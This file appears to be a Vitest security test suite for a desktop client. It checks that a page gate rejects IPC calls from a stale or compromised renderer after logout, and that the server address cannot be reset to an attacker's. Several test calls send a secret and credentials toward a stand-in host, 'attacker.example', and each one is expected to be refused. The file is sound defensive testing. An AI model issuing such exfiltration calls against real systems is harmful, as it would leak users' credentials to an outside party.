import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { generateAccountKeypair, toB64 } from '@ternix/core/crypto';
import { ServerAddressStore } from '../src/main/app/serverAddress.js';
import type { FetchLike } from '../src/main/client/index.js';
import { TypedEmitter } from '../src/main/client/emitter.js';
import { createDispatcher } from '../src/main/ipc/dispatch.js';
import { createHandlers, type HandlerDeps } from '../src/main/ipc/handlers.js';
import {
  leavesSession,
  PageGate,
  type SessionSource,
  SessionNotices,
} from '../src/main/ipc/pageGate.js';
import { rpcSchemas } from '../src/main/ipc/schemas.js';
import type { ClientEvents } from '../src/shared/events.js';
import type { ClientState } from '../src/shared/types.js';
import {
  closeClients,
  makeClient,
  registerUser,
  startServer,
  type TestClient,
  type TestServer,
  uniqueEmail,
} from './helpers.js';

/**
 * A compromised renderer can keep revealed secrets in its own JavaScript. These tests check
 * that once the client leaves a session, nothing that page sends is honoured any more.
 */

let server: TestServer;
let dir: string;

beforeEach(async () => {
  server = await startServer();
  dir = mkdtempSync(join(tmpdir(), 'ternix-page-gate-'));
});

afterEach(async () => {
  await closeClients();
  await server.close();
  rmSync(dir, { recursive: true, force: true });
});

const ATTACKER = 'https://attacker.example/leak-SECRET';

function wire(t: TestClient) {
  const reload = vi.fn();
  const pages = new PageGate(reload);
  pages.watch(t.client);
  const notices = new SessionNotices();
  notices.watch(t.client);
  const serverAddress = new ServerAddressStore(dir);
  const ssh = { cancelAllPrompts: vi.fn(), closeAll: vi.fn(async () => undefined) };
  const handlers = createHandlers({
    client: t.client,
    ssh,
    secrets: { assertAvailable: () => undefined },
    serverAddress,
    notices,
    messageBox: vi.fn(async () => ({ response: 0, checkboxChecked: false })),
  } as unknown as HandlerDeps);
  const dispatch = pages.guard(createDispatcher(rpcSchemas, handlers));
  return { pages, reload, dispatch, serverAddress, ssh };
}

describe('leaving a session replaces the page', () => {
  it('refuses everything the page sends after logout; the fresh page can probe', async () => {
    const a = await registerUser(server, { realtime: false });
    const { pages, reload, dispatch } = wire(a);
    const old = pages.issue();
    expect(await dispatch(old, 'items.all', undefined)).toMatchObject({ ok: true });

    expect(await dispatch(old, 'auth.logout', undefined)).toMatchObject({ ok: true });
    expect(a.client.state).toBe('loggedOut');
    expect(reload).toHaveBeenCalledTimes(1);

    const before = a.spy.calls.length;
    for (const [method, arg] of [
      ['server.probe', { address: ATTACKER }],
      ['server.remember', { serverUrl: ATTACKER }],
      ['auth.login', { serverUrl: ATTACKER, email: 'x@attacker.example', password: 'SECRET' }],
      [
        'auth.register',
        { serverUrl: ATTACKER, email: 'x@attacker.example', name: 'x', password: 'SECRET-pw' },
      ],
      ['client.snapshot', undefined],
    ] as const) {
      expect(await dispatch(old, method, arg), method).toMatchObject({
        ok: false,
        error: { code: 'stale_page' },
      });
    }
    expect(a.spy.calls.length).toBe(before); // nothing went out

    const fresh = pages.issue();
    expect(fresh).not.toBe(old);
    expect(await dispatch(fresh, 'server.probe', { address: server.url })).toMatchObject({
      ok: true,
      value: { serverUrl: server.url },
    });
  });

  it('locking keeps the page (probing is refused while locked anyway)', async () => {
    const a = await registerUser(server, { realtime: false });
    const { pages, reload, dispatch } = wire(a);
    const page = pages.issue();
    expect(await dispatch(page, 'auth.lock', undefined)).toMatchObject({ ok: true });
    expect(reload).not.toHaveBeenCalled();
    expect(await dispatch(page, 'server.probe', { address: ATTACKER })).toMatchObject({
      ok: false,
      error: { code: 'forbidden' },
    });
    expect(await dispatch(page, 'client.snapshot', undefined)).toMatchObject({ ok: true });
  });

  it('retires the page on logout, expiry and revocation only', () => {
    const emitter = new TypedEmitter<ClientEvents>();
    const client = {
      state: 'loggedOut' as ClientState,
      on: emitter.on.bind(emitter),
    } as unknown as SessionSource;
    const reload = vi.fn();
    const pages = new PageGate(reload);
    pages.watch(client);
    const go = (state: ClientState) => emitter.emit('state', state);
    go('unlocked'); // login
    go('locked');
    go('unlocked');
    expect(reload).not.toHaveBeenCalled();
    go('expired');
    expect(reload).toHaveBeenCalledTimes(1);
    go('loggedOut'); // "use a different account" from the expired screen: already replaced
    expect(reload).toHaveBeenCalledTimes(1);
    go('unlocked');
    go('loggedOut');
    expect(reload).toHaveBeenCalledTimes(2);
    go('locked'); // a saved session, then a revoked one
    go('expired');
    expect(reload).toHaveBeenCalledTimes(3);
    expect(pages.isCurrent(1)).toBe(false);
    expect(pages.isCurrent(4)).toBe(true);

    expect(leavesSession('unlocked', 'locked')).toBe(false);
    expect(leavesSession('locked', 'loggedOut')).toBe(true);
  });

  it('keeps why the session ended for the next page, until a session starts', () => {
    const emitter = new TypedEmitter<ClientEvents>();
    const notices = new SessionNotices();
    notices.watch({ state: 'unlocked', on: emitter.on.bind(emitter) } as unknown as SessionSource);
    emitter.emit('state', 'expired');
    emitter.emit('session-revoked', { reason: 'revoked' });
    expect(notices.current).toBe('revoked');
    emitter.emit('state', 'unlocked');
    expect(notices.current).toBeNull();
  });
});

describe('auth.logout without a session', () => {
  /** A server that answers registration with another account key than the client sent. */
  const lyingFetch: FetchLike = async (input, init) => {
    const res = await globalThis.fetch(input, init);
    if (!new URL(input).pathname.endsWith('/auth/register') || !res.ok) return res;
    const body = (await res.json()) as { user: { public_key: string } };
    body.user.public_key = toB64(generateAccountKeypair().publicKey);
    return new Response(JSON.stringify(body), {
      status: res.status,
      headers: { 'content-type': 'application/json' },
    });
  };

  it('succeeds after an own-key mismatch during register left no session', async () => {
    const t = await makeClient({ fetch: lyingFetch });
    const { pages, reload, dispatch } = wire(t);
    const page = pages.issue();
    const register = await dispatch(page, 'auth.register', {
      serverUrl: server.url,
      email: uniqueEmail(),
      name: 'Mallory victim',
      password: 'correct horse battery',
    });
    expect(register).toMatchObject({ ok: false, error: { code: 'own_key_mismatch' } });
    expect(t.client.state).toBe('loggedOut');

    expect(await dispatch(page, 'auth.logout', undefined)).toEqual({
      ok: true,
      value: { serverRevoked: true },
    });
    expect(reload).not.toHaveBeenCalled(); // no session was left, the page stays
    expect(await dispatch(page, 'server.probe', { address: server.url })).toMatchObject({
      ok: true,
    });
  });

  it('is idempotent after a normal logout', async () => {
    const a = await registerUser(server, { realtime: false });
    const { pages, dispatch } = wire(a);
    expect(await dispatch(pages.issue(), 'auth.logout', undefined)).toMatchObject({ ok: true });
    expect(await dispatch(pages.issue(), 'auth.logout', {})).toEqual({
      ok: true,
      value: { serverRevoked: true },
    });
  });
});

describe('the server address to sign in to', () => {
  it('is kept by main and cannot be set by a signed-in page', async () => {
    const a = await registerUser(server, { realtime: false });
    const { pages, dispatch, serverAddress } = wire(a);
    const page = pages.issue();
    expect(await dispatch(page, 'server.remember', { serverUrl: ATTACKER })).toMatchObject({
      ok: false,
      error: { code: 'forbidden' },
    });
    expect(serverAddress.get()).toBeNull();

    // Logout: the window is replaced, and the next page starts at the remembered address.
    expect(await dispatch(page, 'auth.logout', undefined)).toMatchObject({ ok: true });
    const fresh = pages.issue();
    expect(await dispatch(fresh, 'client.snapshot', undefined)).toMatchObject({
      ok: true,
      value: { state: 'loggedOut', serverUrl: null, notice: null },
    });
    expect(await dispatch(fresh, 'server.remember', { serverUrl: server.url })).toMatchObject({
      ok: true,
    });
    expect(serverAddress.get()).toBe(server.url);

    // It survives a restart.
    const reloaded = new ServerAddressStore(dir);
    expect(await reloaded.load()).toBe(server.url);
  });

  it('a sign-in remembers its server, and "change server" forgets it', async () => {
    const t = await makeClient();
    const { pages, dispatch, serverAddress } = wire(t);
    const email = uniqueEmail();
    expect(
      await dispatch(pages.issue(), 'auth.register', {
        serverUrl: server.url,
        email,
        name: 'Alice',
        password: 'correct horse battery',
      }),
    ).toMatchObject({ ok: true });
    expect(serverAddress.get()).toBe(server.url);
    expect(await dispatch(pages.issue(), 'auth.logout', { forgetServer: true })).toMatchObject({
      ok: true,
    });
    expect(serverAddress.get()).toBeNull();
  });
});
